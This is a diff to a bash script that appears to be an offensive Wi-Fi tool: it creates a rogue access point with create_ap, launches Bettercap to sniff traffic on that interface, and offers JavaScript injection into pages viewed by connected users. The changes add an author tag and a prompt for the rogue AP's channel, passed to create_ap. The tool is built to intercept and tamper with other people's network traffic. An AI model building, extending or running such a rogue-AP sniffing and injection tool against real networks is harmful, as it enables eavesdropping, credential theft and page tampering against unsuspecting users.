@@ -1,4 +1,5 @@
 #!/bin/bash
+# AUTHOR: 90N45
 
 cyan='\e[1;36m'
 red='\e[1;31m'
@@ -121,6 +122,11 @@ read -p " " ssid
 clear
 print_banner_quik
 sleep 0.2
+printf "\n${white} | Write down the 2.4 GHz channel for your rogue AP (ex. 6):${clean}"
+read -p " " channel
+clear
+print_banner_quik
+sleep 0.2
 printf "\n${purple}[1] ${lightpurple}180°-JS (if page was clicked, rotate it)\n"
 sleep 0.2
 printf "\n${red}[2] ${lightred}Custom\n"
@@ -161,7 +167,7 @@ clear
 print_banner_quik
 sleep 0.2
 printf "\n${red}[*] ${lightred}Creating rogue AP on ${interface} as ${ssid}...\n\n${cyan}"
-create_ap ${interface} ${net_interface} ${ssid} --daemon --no-virt > /dev/null
+create_ap ${interface} ${net_interface} ${ssid} -c ${channel} --daemon --no-virt > /dev/null
 sleep 10
 printf "\n${red}[*] ${lightred}Starting Bettercap as sniffer on ${interface}...\n\n${cyan}"
 sleep 1
@@ -217,7 +223,7 @@ create_ap ${interface} ${net_interface} ${ssid} --daemon --no-virt > /dev/null
 sleep 10
 printf "\n${red}[*] ${lightred}Starting Bettercap as sniffer on ${interface}...\n\n${cyan}"
 sleep 1
-bettercap -iface $interface -caplet sniffconf.cap
+bettercap -iface ${interface} -caplet sniffconf.cap
 fi
 clear
 print_banner_quik
@@ -368,3 +374,4 @@ printf "\n${cyan}GOOD BYE!\n"
 rm BetterSniff_injection.js 2> /dev/null
 rm sniffconf.cap 2> /dev/null
 create_ap --stop ${interface} > /dev/null
+
